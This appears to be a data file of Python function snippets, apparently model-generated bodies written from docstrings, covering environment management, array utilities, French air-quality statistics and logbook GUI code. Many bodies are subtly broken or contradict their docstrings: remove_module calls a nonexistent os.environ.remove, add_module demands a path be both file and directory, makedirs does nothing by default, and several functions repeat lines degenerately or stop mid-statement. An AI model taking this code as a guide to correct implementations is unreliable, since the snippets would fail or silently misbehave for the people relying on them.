        "def remove_module(module):\n    \"\"\"Remove a module from CPENV_ACTIVE_MODULES environment variable\"\"\"\n    if module in os.environ:\n        os.environ.remove(module)",
        "def format_envs(envs):\n    \"\"\"Format a list of environments and modules for terminal output\"\"\"\n    out = []\n    for env in envs:\n        out.append(env.name)\n        out.append(env.path)\n        out.append(env.module_path)\n    return '\\n'.join(out)",
        "def show_context(self):\n        \"\"\"Show context info\"\"\"\n        if self.context is None:\n            return\n        if self.context.get('type') == 'project':\n            self.show_project_context()\n        elif self.context.get('type') == 'project_group':\n            self.show_project_group_context()\n        elif self.context.get('type') == 'project_group_member':\n            self.show_project_group_member_context()\n        elif self.context.get('type') == 'project_member':\n            self.show_project_member_context()\n        elif self.context.get('type') == 'project_member_group':\n            self.show_project_member_group_context()\n        elif self.context.get('type') == 'project_member_group_member':\n           ",
        "def activate(self, env):\n        \"\"\"Activate an environment\"\"\"\n        if env not in self.envs:\n            raise ValueError(\"Unknown environment: %s\" % env)\n        self.envs[env].activate()",
        "def create_environment(self, name, **kwargs):\n        \"\"\"Create a new environment.\"\"\"\n        return self.post(self.environment_path % (name), data=kwargs)",
        "def remove_environment(self, env_name):\n        \"\"\"Remove an environment\"\"\"\n        self.log.debug(\"Removing environment %s\", env_name)\n        self.client.remove_environment(env_name)",
        "def add_environment(name, path):\n    \"\"\"\n    Add an environment to the cache. Allows you to activate the environment\n    by name instead of by full path\n    \"\"\"\n    if not os.path.exists(path):\n        raise EnvironmentNotFound(name)\n    if not os.path.isdir(path):\n        raise EnvironmentNotFound(name)\n    if not os.path.isdir(os.path.join(path, 'environments')):\n        os.makedirs(os.path.join(path, 'environments'))\n    if not os.path.isdir(os.path.join(path, 'environments', name)):\n        os.makedirs(os.path.join(path, 'environments', name))\n    if not os.path.isdir(os.path.join(path, 'environments', name, 'environments')):\n       ",
        "def remove_cached_environment(name):\n    \"\"\"\n    Remove a cached environment. Removed paths will no longer be able to\n    be activated by name\n    \"\"\"\n    if name in _cached_environments:\n        del _cached_environments[name]",
        "def create_module(name, path=None):\n    \"\"\"Create a new template module.\n\n    You can also specify a filesystem path like \"./modules/new_module\"\n    \"\"\"\n    if path is None:\n        path = os.path.join(os.path.dirname(__file__), \"modules\")\n    if not os.path.exists(path):\n        os.makedirs(path)\n    with open(os.path.join(path, name), \"w\") as f:\n        f.write(\"module %s\\n\" % name)",
        "def add_module(path, module):\n    \"\"\"\n    Add a module to an environment. PATH can be a git repository path or\n    a filesystem path.\n    \"\"\"\n    if not os.path.exists(path):\n        raise ValueError(\"Module %s does not exist\" % path)\n\n    if not os.path.isdir(path):\n        raise ValueError(\"Module %s is not a directory\" % path)\n\n    if not os.path.isfile(path):\n        raise ValueError(\"Module %s is not a file\" % path)\n\n    if not os.path.isdir(module.path):\n        raise ValueError(\"Module %s is not a directory\" % module.path)\n\n    if not os.path.isfile(module.path):\n        raise ValueError(\"Module %s is not a file\" % module.path)\n\n    if not",
        "def copy_module(module_name):\n    \"\"\"Copy a global module to the active environment.\"\"\"\n    if module_name in sys.modules:\n        module = sys.modules[module_name]\n        if hasattr(module, '__file__'):\n            module_path = os.path.dirname(module.__file__)\n            if module_path:\n                os.chdir(module_path)\n        sys.modules[module_name] = module",
        "def resolve_virtual_env(self, virtual_env):\n        \"\"\"Resolves VirtualEnvironments with a relative or absolute path\"\"\"\n        if virtual_env.startswith('/'):\n            virtual_env = os.path.join(self.virtual_env_root, virtual_env)\n        return virtual_env",
        "def _resolve_virtual_envs():\n    \"\"\"Resolves VirtualEnvironments in CPENV_HOME\"\"\"\n    for env in os.environ.get('CPENV_HOME', '').split(os.pathsep):\n        if env:\n            yield env",
        "def resolve_virtual_environments(self):\n        \"\"\"Resolves VirtualEnvironments in EnvironmentCache\"\"\"\n        for env in self.virtual_environments:\n            self.environment_cache.resolve_virtual_environment(env)",
        "def resolve_module(self, module_name):\n        \"\"\"Resolves module in previously resolved environment.\"\"\"\n        if module_name in self.modules:\n            return self.modules[module_name]\n        else:\n            return self.resolve_module_from_env(module_name)",
        "def resolve_modules(self):\n        \"\"\"Resolves modules in currently active environment.\"\"\"\n        if self.current_environment is not None:\n            self.current_environment.resolve_modules()",
        "def resolve_environment(env_file):\n    \"\"\"\n    Resolves environment from .cpenv file...recursively walks up the tree\n    in attempt to find a .cpenv file\n    \"\"\"\n    if os.path.isfile(env_file):\n        with open(env_file) as f:\n            for line in f:\n                if line.startswith('#') or line.startswith('#'):\n                    continue\n                if line.startswith('ENV'):\n                    return line.split('=')[1].strip()\n    return None",
        "def transpose(a, axes=None):\n    \"\"\"Returns a view of the array with axes transposed.\n\n    For a 1-D array, this has no effect.\n    For a 2-D array, this is the usual matrix transpose.\n    For an n-D array, if axes are given, their order indicates how the\n    axes are permuted\n\n    Args:\n      a (array_like): Input array.\n      axes (list of int, optional): By default, reverse the dimensions,\n        otherwise permute the axes according to the values given.\n    \"\"\"\n    if axes is None:\n        axes = list(range(a.ndim))\n    else:\n        axes = list(set(axes))\n    if axes == []:\n        return a\n    else:\n        return a.transpose(axes)",
        "def roll_backward(a, axis, start=0):\n    \"\"\"Roll the specified axis backwards, until it lies in a given position.\n\n    Args:\n      a (array_like): Input array.\n      axis (int): The axis to roll backwards.  The positions of the other axes \n        do not change relative to one another.\n      start (int, optional): The axis is rolled until it lies before this \n        position.  The default, 0, results in a \"complete\" roll.\n\n    Returns:\n      res (ndarray)\n    \"\"\"\n    if axis < 0:\n        raise ValueError('axis must be greater than 0')\n    if axis > len(a):\n        raise ValueError('axis must be less than the length of the array')\n    if start < 0:\n        raise ValueError('start must be greater than 0')\n    if start > len(a):",
        "def insert_axis(a, axis):\n    \"\"\"Insert a new axis, corresponding to a given position in the array shape\n\n    Args:\n      a (array_like): Input array.\n      axis (int): Position (amongst axes) where new axis is to be inserted.\n    \"\"\"\n    if axis < 0:\n        raise ValueError('axis must be greater than 0')\n    if axis >= len(a.shape):\n        raise ValueError('axis must be less than array length')\n    a = np.asarray(a)\n    a = a.reshape(a.shape[:axis] + [0])\n    return a",
        "def join(tup, axis=0):\n    \"\"\"Join a sequence of arrays together. \n    Will aim to join `ndarray`, `RemoteArray`, and `DistArray` without moving \n    their data, if they happen to be on different engines.\n\n    Args:\n      tup (sequence of array_like): Arrays to be concatenated. They must have\n        the same shape, except in the dimension corresponding to `axis`.\n      axis (int, optional): The axis along which the arrays will be joined.\n\n    Returns: \n      res: `ndarray`, if inputs were all local\n           `RemoteArray`, if inputs were all on the same remote engine\n           `DistArray`, if inputs were already scattered on different engines\n    \"\"\"\n    if len(tup) == 1:\n        return tup[0]\n    elif len(tup) == 2:\n        return np.concatenate",
        "def broadcast_shape(inputs, axis):\n    \"\"\"Return the shape that would result from broadcasting the inputs\"\"\"\n    if axis == 0:\n        return inputs.shape\n    else:\n        return inputs.shape[:axis]",
        "def mean(a, axis=None, dtype=None, out=None, keepdims=False):\n    \"\"\"Compute the arithmetic mean along the specified axis.\n\n    Returns the average of the array elements.  The average is taken over\n    the flattened array by default, otherwise over the specified axis.\n    `float64` intermediate and return values are used for integer inputs.\n\n    Parameters\n    ----------\n    a : array_like\n        Array containing numbers whose mean is desired. If `a` is not an\n        array, a conversion is attempted.\n    axis : None or int or tuple of ints, optional\n        Axis or axes along which the means are computed. The default is to\n        compute the mean of the flattened array.\n        If this is a tuple of ints, a mean is performed over multiple axes,\n        instead of a single axis or all the axes as before.\n    dtype : data-",
        "def _is_valid_axis(self, ax):\n        \"\"\"\n        `ax` is a valid candidate for a distributed axis if the given\n        subarray shapes are all the same when ignoring axis `ax`\n        \"\"\"\n        if ax is None:\n            return True\n        if ax.ndim == 1:\n            return self.shape == ax.shape\n        return False",
        "def _check_result(self, result):\n        \"\"\"Returns True if successful, False if failure\"\"\"\n        if result is None:\n            return False\n        if result.get('success'):\n            return True\n        if result.get('error'):\n            raise Exception(result.get('error'))\n        return False",
        "def _get_subshell_command(self, subshell):\n        \"\"\"Return a command to launch a subshell\"\"\"\n        command = self.subshell_command\n        if command is None:\n            command = self.subshell_command = self._get_subshell_command_from_env()\n        return command",
        "def _prompt_prefix(prefix):\n    \"\"\"Generate a prompt with a given prefix\n\n    linux/osx: [prefix] user@host cwd $\n          win: [prefix] cwd:\n    \"\"\"\n    if platform.system() == 'Linux':\n        return _prompt_linux(prefix)\n    elif platform.system() == 'Windows':\n        return _prompt_win(prefix)",
        "def launch_subshell(self, subshell):\n        \"\"\"Launch a subshell\"\"\"\n        if self.subshells:\n            raise RuntimeError(\"Subshells are not supported\")\n        self.subshells.append(subshell)\n        self.subshells_running = True",
        "def add_file(self, file):\n        \"\"\"Append a file to file repository.\n\n        For file monitoring, monitor instance needs file.\n        Please put the name of file to `file` argument.\n\n        :param file: the name of file you want monitor.\n        \"\"\"\n        if not file:\n            raise ValueError(\"file argument is required\")\n        self.files.append(file)",
        "def append_files(self, filelist):\n        \"\"\"Append files to file repository.\n        \n        ModificationMonitor can append files to repository using this.\n        Please put the list of file names to `filelist` argument.\n\n        :param filelist: the list of file nmaes\n        \"\"\"\n        for filename in filelist:\n            self.add_file(filename)",
        "def run(self, sleep=1):\n        \"\"\"Run file modification monitor.\n\n        The monitor can catch file modification using timestamp and file body. \n        Monitor has timestamp data and file body data. And insert timestamp \n        data and file body data before into while roop. In while roop, monitor \n        get new timestamp and file body, and then monitor compare new timestamp\n        to originaltimestamp. If new timestamp and file body differ original,\n        monitor regard thease changes as `modification`. Then monitor create\n        instance of FileModificationObjectManager and FileModificationObject,\n        and monitor insert FileModificationObject to FileModificationObject-\n        Manager. Then, yield this object.\n\n        :param sleep: How times do you sleep in while roop.\n        \"\"\"\n        while True:\n            try:\n                self.get_timestamp_and_file_body()\n                self.insert_timestamp_and_",
        "def status_job(self, name=None, timeout=None, **kwargs):\n        \"\"\"\n        Decorator that invokes `add_status_job`.\n\n        ::\n\n            @app.status_job\n            def postgresql():\n                # query/ping postgres\n\n            @app.status_job(name=\"Active Directory\")\n            def active_directory():\n                # query active directory\n\n            @app.status_job(timeout=5)\n            def paypal():\n                # query paypal, timeout after 5 seconds\n        \"\"\"\n        def decorator(func):\n            self.add_status_job(name, func, timeout, **kwargs)\n            return func\n        return decorator",
        "def pager(text, program, color=None):\n    \"\"\"Page through text by feeding it to another program.  Invoking a\n    pager through this might support colors.\n    \"\"\"\n    if color is None:\n        color = get_color()\n    if isinstance(program, str):\n        program = get_program(program)\n    if not isinstance(program, Program):\n        raise ValueError(\"pager() expects a Program object\")\n    if not isinstance(text, str):\n        raise ValueError(\"pager() expects a string to be passed\")\n    if not isinstance(color, Color):\n        raise ValueError(\"pager() expects a Color object to be passed\")\n    if not isinstance(program, Program):\n        raise ValueError(\"pager() expects a Program object to be passed\")\n    if not isinstance(color, Color):\n        raise ValueError(\"pager() expects a Color object to be passed\")\n   ",
        "def profil_annuel(df, func):\n    \"\"\"Calcul du profil annuel\n\n    Param\u00e8tres:\n    df: DataFrame de donn\u00e9es dont l'index est une s\u00e9rie temporelle\n        (cf module xair par exemple)\n    func: function permettant le calcul. Soit un nom de fonction numpy ('mean', 'max', ...)\n        soit la fonction elle-m\u00eame (np.mean, np.max, ...)\n    Retourne:\n    Un DataFrame de moyennes par mois\n    \"\"\"\n    df = df.copy()\n    df.index = df.index.apply(lambda x: x)\n    df = df.apply(lambda x: func(x))\n    return df",
        "def run_hook(name, *args):\n    \"\"\"Attempt to run a global hook by name with args\"\"\"\n    hook = get_hook(name)\n    if hook:\n        return hook(*args)\n    else:\n        raise HookNotFound(name)",
        "def moyennes_glissantes(df, sur, rep):\n    \"\"\"Calcule de moyennes glissantes\n\n    Param\u00e8tres:\n    df: DataFrame de mesures sur lequel appliqu\u00e9 le calcul\n    sur: (int, par d\u00e9faut 8) Nombre d'observations sur lequel s'appuiera le\n    calcul\n    rep: (float, d\u00e9faut 0.75) Taux de r\u00e9pr\u00e9sentativit\u00e9 en dessous duquel le\n    calcul renverra NaN\n\n    Retourne:\n    Un DataFrame des moyennes glissantes calcul\u00e9es\n    \"\"\"\n    df = df.copy()\n    df = df.drop(sur, axis=1)\n    df = df.drop(rep, axis=",
        "def aot40(df, nb_an):\n    \"\"\"Calcul de l'AOT40 du 1er mai au 31 juillet\n\n    *AOT40 : AOT 40 ( exprim\u00e9 en micro g/m\u00b3 par heure ) signifie la somme des\n    diff\u00e9rences entre les concentrations horaires sup\u00e9rieures \u00e0 40 parties par\n    milliard ( 40 ppb soit 80 micro g/m\u00b3 ), durant une p\u00e9riode donn\u00e9e en\n    utilisant uniquement les valeurs sur 1 heure mesur\u00e9es quotidiennement\n    entre 8 heures (d\u00e9but de la mesure) et 20 heures (pile, fin de la mesure) CET,\n    ce qui correspond \u00e0 de 8h",
        "def _validate_environment_cache(self):\n        \"\"\"Validate all the entries in the environment cache.\"\"\"\n        for key, value in self._environment_cache.items():\n            if not isinstance(value, Environment):\n                raise ValueError(\n                    'Environment cache entry for key %s is not an Environment' % key)",
        "def load_env_cache(self):\n        \"\"\"Load the environment cache from disk.\"\"\"\n        if not os.path.exists(self.env_cache_path):\n            return\n        with open(self.env_cache_path, 'r') as f:\n            self.env_cache = json.load(f)",
        "def save_env_cache(self):\n        \"\"\"Save the environment cache to disk.\"\"\"\n        with open(self.env_cache_file, 'w') as f:\n            json.dump(self.env_cache, f)",
        "def prompt(text=None, default=None, hide_input=False,\n          confirmation_prompt=None, type=None, value_proc=None,\n          prompt_suffix=None, show_default=False, err=False):\n    \"\"\"\n    Prompts a user for input.  This is a convenience function that can\n    be used to prompt a user for input later.\n\n    If the user aborts the input by sending a interrupt signal, this\n    function will catch it and raise a :exc:`Abort` exception.\n\n    .. versionadded:: 6.0\n       Added unicode support for cmd.exe on Windows.\n\n    .. versionadded:: 4.0\n       Added the `err` parameter.\n\n    :param text: the text to show for the prompt.\n    :param default: the default value to use if no input happens.  If this\n                    is not given it will",
        "def pager(text, color=None):\n    \"\"\"This function takes a text and shows it via an environment specific\n    pager on stdout.\n\n    .. versionchanged:: 3.0\n       Added the `color` flag.\n\n    :param text: the text to page.\n    :param color: controls if the pager supports ANSI colors or not.  The\n                  default is autodetection.\n    \"\"\"\n    if color is None:\n        color = _is_ansi()\n    if color:\n        _pager(text)\n    else:\n        print(text)",
        "def prepare_for_distributed_object_processing(client=None):\n    \"\"\"Prepare all iPython engines for distributed object processing.\n\n    Args:\n      client (ipyparallel.Client, optional): If None, will create a client\n        using the default ipyparallel profile.\n    \"\"\"\n    if client is None:\n        client = ipyparallel.Client(profile=ipyparallel.Profile.default())\n    for engine in client.engines:\n        engine.prepare_for_distributed_object_processing()",
        "def _get_distributed_objects(self):\n        \"\"\"Retrieve objects that have been distributed, making them local again\"\"\"\n        distributed_objects = self.get_distributed_objects()\n        for obj in distributed_objects:\n            self.local_object(obj)",
        "def parallel(self, func, *args, **kwargs):\n        \"\"\"Apply a function in parallel to each element of the input\"\"\"\n        return self.map(lambda x: func(x, *args, **kwargs))",
        "def configure_engines(self, real_type, proxy_type):\n        \"\"\"\n        Configure engines so that remote methods returning values of type\n        `real_type` will instead return by proxy, as type `proxy_type`\n        \"\"\"\n        self.real_type = real_type\n        self.proxy_type = proxy_type\n        self.proxy_method = self.proxy_type.method\n        self.proxy_method_name = self.proxy_type.method_name\n        self.proxy_method_args = self.proxy_type.method_args\n        self.proxy_method_kwargs = self.proxy_type.method_kwargs\n        self.proxy_method_name_args = self.proxy_type.method_name_args\n        self.proxy_method_kwargs_args = self.proxy_type.method_kwargs_args\n        self.",
        "def is_git_repo(path):\n    \"\"\"Returns True if path is a git repository.\"\"\"\n    try:\n        git_repo = subprocess.check_output(['git', 'rev-parse', '--verify', '--quiet', path])\n    except subprocess.CalledProcessError:\n        return False\n    return True",
        "def is_cpenv_home(path):\n    \"\"\"Returns True if path is in CPENV_HOME\"\"\"\n    if not os.path.isdir(os.path.join(os.path.expanduser('~'), path)):\n        return False\n    return True",
        "def is_cpenv(path):\n    \"\"\"Returns True if path contains a .cpenv file\"\"\"\n    if not os.path.isfile(path):\n        return False\n    if path.endswith('.cpenv'):\n        return True\n    return False",
        "def get_redirect_env_path(self, redirect_file):\n        \"\"\"Get environment path from redirect file\"\"\"\n        redirect_env_path = os.path.join(self.env_path, redirect_file)\n        if not os.path.exists(redirect_env_path):\n            raise IOError(\"Redirect file %s does not exist\" % redirect_file)\n        return redirect_env_path",
        "def expand_path(path):\n    \"\"\"Returns an absolute expanded path\"\"\"\n    if path.startswith('/'):\n        return path\n    return os.path.expanduser(path)",
        "def _expand_path(path):\n    \"\"\"Like os.path.join but also expands and normalizes path parts.\"\"\"\n    if path is None:\n        return None\n    if not path.startswith('/'):\n        path = '/' + path\n    if path.endswith('/'):\n        path = path[:-1]\n    return path",
        "def join(*args):\n    \"\"\"Like os.path.join but acts relative to this packages bin path.\"\"\"\n    return os.path.join(os.path.dirname(__file__), *args)",
        "def makedirs(path, mode=0o777, exist_ok=True):\n    \"\"\"Like os.makedirs but keeps quiet if path already exists\"\"\"\n    if not exist_ok:\n        try:\n            os.makedirs(path, mode)\n        except OSError as e:\n            if e.errno != errno.EEXIST:\n                raise",
        "def walk(path, depth=None):\n    \"\"\"\n    Walk down a directory tree. Same as os.walk but allows for a depth limit\n    via depth argument\n    \"\"\"\n    if depth is None:\n        depth = os.getcwd().count('/')\n    for root, dirs, files in os.walk(path, topdown=depth):\n        yield root, dirs, files",
        "def walk_up(self, path):\n        \"\"\"Walk up a directory tree\"\"\"\n        for root, dirs, files in os.walk(path):\n            for f in files:\n                yield os.path.join(root, f)",
        "def preprocess_env(d):\n    \"\"\"\n    Preprocess a dict to be used as environment variables.\n\n    :param d: dict to be processed\n    \"\"\"\n    for k, v in d.items():\n        if isinstance(v, dict):\n            d[k] = preprocess_env(v)\n        elif isinstance(v, list):\n            d[k] = [preprocess_env(v) for v in v]\n        elif isinstance(v, str):\n            d[k] = os.path.expandvars(v)\n        elif isinstance(v, bool):\n            d[k] = str(v).lower()\n        elif isinstance(v, int):\n            d[k] = str(v).lower()\n        elif isinstance(v, float):\n            d[k] = str(v).lower()\n        elif isinstance(v, str):",
        "def add_sequence(self, name, value):\n        \"\"\"Add a sequence value to env dict\"\"\"\n        if name not in self.env:\n            self.env[name] = []\n        self.env[name].append(value)",
        "def join_dicts(dicts):\n    \"\"\"Join a bunch of dicts\"\"\"\n    return [d for d in dicts if d]",
        "def env_to_dict(env, pathsep='/'):\n    \"\"\"\n    Convert a dict containing environment variables into a standard dict.\n    Variables containing multiple values will be split into a list based on\n    the argument passed to pathsep.\n\n    :param env: Environment dict like os.environ.data\n    :param pathsep: Path separator used to split variables\n    \"\"\"\n    return {k: v.split(pathsep) for k, v in env.items()}",
        "def dict_to_env(d, pathsep=os.pathsep):\n    \"\"\"Convert a python dict to a dict containing valid environment variable\n    values.\n\n    :param d: Dict to convert to an env dict\n    :param pathsep: Path separator used to join lists(default os.pathsep)\n    \"\"\"\n    env = {}\n    for k, v in d.items():\n        if isinstance(v, list):\n            env[k] = pathsep.join(v)\n        elif isinstance(v, dict):\n            env[k] = dict_to_env(v, pathsep)\n        else:\n            env[k] = v\n    return env",
        "def expand_env(env):\n    \"\"\"Expand all environment variables in an environment dict\n\n    :param env: Environment dict\n    \"\"\"\n    for key, value in env.items():\n        if isinstance(value, dict):\n            env[key] = expand_env(value)\n        elif isinstance(value, list):\n            env[key] = [expand_env(v) for v in value]\n        elif isinstance(value, str):\n            env[key] = value.replace('$', '')\n        elif isinstance(value, bool):\n            env[key] = str(value).lower()\n        elif isinstance(value, int):\n            env[key] = str(value).lower()\n        elif isinstance(value, float):\n            env[key] = str(value).lower()\n        elif isinstance(value, str):\n            env[key] = value.",
        "def _get_unused_filepath(self):\n        \"\"\"Returns an unused random filepath.\"\"\"\n        return os.path.join(self.tmp_dir,\n                            self.random.choice(\n                                [self.random_filename,\n                                 'tmp']))",
        "def encode_env(path=None):\n    \"\"\"Encode current environment as yaml and store in path or a temporary\n    file. Return the path to the stored environment.\n    \"\"\"\n    if path is None:\n        path = tempfile.mkdtemp()\n    with open(path, 'w') as f:\n        yaml.dump(os.environ, f)\n    return path",
        "def get_upstream_uri(self, uri):\n        \"\"\"Returns the URL to the upstream data source for the given URI based on configuration\"\"\"\n        if self.config.get('upstream_uri'):\n            return self.config.get('upstream_uri')\n        else:\n            return self.config.get('data_source', 'upstream')",
        "def _get_request(self, method, url, **kwargs):\n        \"\"\"Return request object for calling the upstream\"\"\"\n        if self.auth:\n            kwargs.update({'auth': self.auth})\n        return self.session.request(method, url, **kwargs)",
        "def get_cache_time(self, request):\n        \"\"\"\n        Returns time to live in seconds. 0 means no caching.\n\n        Criteria:\n        - response code 200\n        - read-only method (GET, HEAD, OPTIONS)\n        Plus http headers:\n        - cache-control: option1, option2, ...\n          where options are:\n          private | public\n          no-cache\n          no-store\n          max-age: seconds\n          s-maxage: seconds\n          must-revalidate\n          proxy-revalidate\n        - expires: Thu, 01 Dec 1983 20:00:00 GMT\n        - pragma: no-cache (=cache-control: no-cache)\n\n        See http://www.mobify.com/blog/beginners-guide-to-http-cache-headers/\n\n        TODO: tests\n        \"\"\"\n       ",
        "def manifest_in(options):\n    \"\"\"\n    Guarantee the existence of a basic MANIFEST.in.\n\n    manifest doc: http://docs.python.org/distutils/sourcedist.html#manifest\n\n    `options.paved.dist.manifest.include`: set of files (or globs) to include with the `include` directive.\n\n    `options.paved.dist.manifest.recursive_include`: set of files (or globs) to include with the `recursive-include` directive.\n\n    `options.paved.dist.manifest.prune`: set of files (or globs) to exclude with the `prune` directive.\n\n    `options.paved.dist.manifest.include_sphinx_docroot`: True -> sphinx docroot is added as `graft`\n\n    `options.paved.dist.manifest.",
        "def format_pathname(pathname, max_length=3):\n    \"\"\"Format a pathname\n\n    :param str pathname: Pathname to format\n    :param int max_length: Maximum length of result pathname (> 3)\n    :return: Formatted pathname\n    :rtype: str\n    :raises ValueError: If *max_length* is not larger than 3\n\n    This function formats a pathname so it is not longer than *max_length*\n    characters. The resulting pathname is returned. It does so by replacing\n    characters at the start of the *pathname* with three dots, if necessary.\n    The idea is that the end of the *pathname* is the most important part\n    to be able to identify the file.\n    \"\"\"\n    if len(pathname) > max_length:\n        raise ValueError(\"Pathname is too long: %s\" % pathname)\n    if len",
        "def format_uuid(uuid, max_length=10):\n    \"\"\"Format a UUID string\n\n    :param str uuid: UUID to format\n    :param int max_length: Maximum length of result string (> 3)\n    :return: Formatted UUID\n    :rtype: str\n    :raises ValueError: If *max_length* is not larger than 3\n\n    This function formats a UUID so it is not longer than *max_length*\n    characters. The resulting string is returned. It does so by replacing\n    characters at the end of the *uuid* with three dots, if necessary.\n    The idea is that the start of the *uuid* is the most important part\n    to be able to identify the related entity.\n\n    The default *max_length* is 10, which will result in a string\n    containing the first 7 characters of the *uuid* passed in. Most",
        "def _get_next_and_previous(self, data):\n        \"\"\" attempts to get next and previous on updates \"\"\"\n        if self.next_update_time is None:\n            return None, None\n        else:\n            return self.next_update_time, self.previous_update_time",
        "def notify_client(payload):\n    \"\"\"Notify the client of the result of handling a request\n\n    The payload contains two elements:\n\n    - client_id\n    - result\n\n    The *client_id* is the id of the client to notify. It is assumed\n    that the notifier service is able to identify the client by this id\n    and that it can pass the *result* to it.\n\n    The *result* always contains a *status_code* element. In case the\n    message passed in is not None, it will also contain a *message*\n    element.\n\n    In case the notifier service does not exist or returns an error,\n    an error message will be logged to *stderr*.\n    \"\"\"\n    client_id = payload['client_id']\n    result = payload['result']\n    status_code = result.get('status_code')\n   ",
        "def get_setting(self, name_hyphen):\n        \"\"\"\n        Retrieves the setting value whose name is indicated by name_hyphen.\n\n        Values starting with $ are assumed to reference environment variables,\n        and the value stored in environment variables is retrieved. It's an\n        error if thes corresponding environment variable it not set.\n        \"\"\"\n        if name_hyphen.startswith('$'):\n            raise ValueError(\"Setting name must not start with '$'\")\n        return self.get_setting_from_env(name_hyphen)",
        "def update_settings(self, enforce_helpstring=True):\n        \"\"\"\n        This method does the work of updating settings. Can be passed with\n        enforce_helpstring = False which you may want if allowing end users to\n        add arbitrary metadata via the settings system.\n\n        Preferable to use update_settings (without leading _) in code to do the\n        right thing and always have docstrings.\n        \"\"\"\n        if enforce_helpstring:\n            self.helpstring = self.helpstring.replace('_', ' ')\n        self.settings = self.settings.replace('_', ' ')\n        self.settings = self.settings.replace(' ', '_')\n        self.settings = self.settings.replace(' ', '')\n        self.settings = self.settings.replace('\\n', '')\n        self.settings = self.settings.replace('\\r', '')\n       ",
        "def _get_setting_and_attribute_values(self, setting_name, attribute_name):\n        \"\"\"Return a combined dictionary of setting values and attribute values.\"\"\"\n        setting_values = self.get_setting(setting_name)\n        attribute_values = self.get_attribute(attribute_name)\n        return setting_values, attribute_values",
        "def _get_class_or_name(name):\n    \"\"\"Detect if we get a class or a name, convert a name to a class.\"\"\"\n    if isinstance(name, str):\n        name = name.lower()\n        if name in _CLASS_NAMES:\n            return _CLASS_NAMES[name]\n        else:\n            raise ValueError(\"Unknown class name: %s\" % name)\n    else:\n        return name",
        "def assert_has_docstring(self, class_name):\n        \"\"\"Asserts that the class has a docstring, returning it if successful.\"\"\"\n        if not self.has_docstring(class_name):\n            raise AssertionError(\n                \"Class '%s' has no docstring.\" % class_name)\n        return class_name",
        "def get_resource_path(self, resource):\n        \"\"\"Get absolute path to resource, works for dev and for PyInstaller\"\"\"\n        if self.is_dev:\n            return self.get_dev_resource_path(resource)\n        return self.get_installer_resource_path(resource)",
        "def add_logbook_selection_window(self, logbook_selection_window):\n        \"\"\"Add new block of logbook selection windows. Only 5 allowed.\"\"\"\n        if len(self.logbook_selection_windows) > 5:\n            raise ValueError(\"Can't add more than 5 logbook selection windows.\")\n        self.logbook_selection_windows.append(logbook_selection_window)",
        "def remove_menu(self, menu):\n        \"\"\"Remove logbook menu set.\"\"\"\n        if menu in self.menu:\n            self.menu.remove(menu)\n            self.menu_count -= 1",
        "def get_log_books(self, book_type):\n        \"\"\"Return selected log books by type.\"\"\"\n        return [book for book in self.log_books if book.type == book_type]",
        "def _verify_user_name(self, user_name):\n        \"\"\"Verify enetered user name is on accepted MCC logbook list.\"\"\"\n        if user_name not in self.user_names:\n            raise ValueError(\n                'User name \"{}\" is not in accepted MCC logbook list'.format(user_name)\n            )",
        "def _parse_xml_elements(self, root):\n        \"\"\"Parse xml elements for pretty printing\"\"\"\n        for elem in root.findall('.//{http://www.w3.org/2001/XMLSchema}element'):\n            self._parse_element(elem)",
        "def pixmap_to_image(pixmap, filename):\n    \"\"\"Convert supplied QPixmap object to image file.\"\"\"\n    pixmap = pixmap.convertToFormat(QPixmap.Format_ARGB32)\n    pixmap.save(filename)",
        "def submit_logbook_entry(self):\n        \"\"\"Process user inputs and subit logbook entry when user clicks Submit button\"\"\"\n        if self.logbook_entry_form.validate_on_submit():\n            self.logbook_entry_form.save()\n            self.logbook_entry_form.clear_errors()\n            self.logbook_entry_form.save_to_db()\n            self.logbook_entry_form.clear_logbook_entry_errors()\n            self.logbook_entry_form.save_to_db()\n            self.logbook_entry_form.clear_logbook_entry_errors()\n            self.logbook_entry_form.save_to_db()\n            self.logbook_entry_form.clear_logbook_entry_errors()\n            self.logbook_entry_form.save_",
        "def process_log(self, log):\n        \"\"\"Process log information and push to selected logbooks.\"\"\"\n        if not self.logbooks:\n            return\n\n        for logbook in self.logbooks:\n            logbook.process_log(log)",
        "def create_menu_objects(self):\n        \"\"\"Create graphical objects for menus.\"\"\"\n        self.menu_objects = []\n        for menu in self.menus:\n            self.menu_objects.append(\n                self.create_menu_object(menu))",
        "def _display_menu(self):\n        \"\"\"Display menus and connect even signals.\"\"\"\n        self.menu = Menu(self)\n        self.menu.add_action(self.menu_action_new, self.menu_new)\n        self.menu.add_action(self.menu_action_open, self.menu_open)\n        self.menu.add_action(self.menu_action_save, self.menu_save)\n        self.menu.add_action(self.menu_action_close, self.menu_close)\n        self.menu.add_separator()\n        self.menu.add_action(self.menu_action_quit, self.menu_quit)\n        self.menu.add_action(self.menu_action_about, self.menu_about)\n        self.menu.add_separator()\n        self.menu.",
        "def logbooks(self, logbooks):\n        \"\"\"Add or change list of logbooks.\"\"\"\n        if logbooks is None:\n            logbooks = []\n        self._logbooks = logbooks\n        self.update_logbooks()",
        "def _remove_logbooks(self):\n        \"\"\"Remove unwanted logbooks from list.\"\"\"\n        for logbook in self.logbooks:\n            if logbook.name not in self.logbooks_to_remove:\n                self.logbooks.remove(logbook)",
        "def _populate_log_program_list(self):\n        \"\"\"Populate log program list to correspond with log type selection.\"\"\"\n        self.log_program_list = []\n        for log_type in self.log_types:\n            self.log_program_list.append(\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n                self.log_program_list.pop(0) +\n",
        "def add_menus(self, parent):\n        \"\"\"Add menus to parent gui.\"\"\"\n        self.menu = QMenu(parent)\n        self.menu.addAction(self.action_new)\n        self.menu.addAction(self.action_open)\n        self.menu.addAction(self.action_save)\n        self.menu.addAction(self.action_save_as)\n        self.menu.addAction(self.action_save_as_new)\n        self.menu.addAction(self.action_save_as_open)\n        self.menu.addAction(self.action_save_as_previous)\n        self.menu.addAction(self.action_save_as_next)\n        self.menu.addAction(self.action_save_as_previous_as)\n        self.menu.addAction(self",
        "def _remove_graphical_objects(self):\n        \"\"\"Iteratively remove graphical objects from layout.\"\"\"\n        for obj in self.layout.objects:\n            if isinstance(obj, GraphicalObject):\n                self.layout.remove(obj)",
        "def add_labels(self, labels):\n        \"\"\"Adds labels to a plot.\"\"\"\n        for label in labels:\n            self.add_label(label)\n        self.update_labels()",
